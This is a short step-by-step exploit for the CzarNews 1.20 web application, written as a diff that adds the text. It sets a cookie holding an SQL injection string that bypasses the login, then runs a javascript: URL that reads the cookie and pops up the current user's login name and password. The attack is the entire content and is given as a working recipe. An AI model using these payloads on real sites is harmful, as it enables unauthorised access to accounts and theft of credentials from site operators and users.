@@ -1,0 +1,8 @@
+1) Go to some page with CzarNews 1.20. You are in the 'Login Page'
+2) Put in the URL: javascript:document.cookie="recook=' or ''=',' or
+''='";void(0);
+3) Refresh the page. Now you are logged in.
+4) Put in the URL:
+javascript:c=document.cookie;p=c.substr(c.lastIndexOf('=')+1).split(/%../);a
+lert("Login: " + p[0] + "\nPass: " + p[1]);void(0);
+5) With this you getted the current user and password
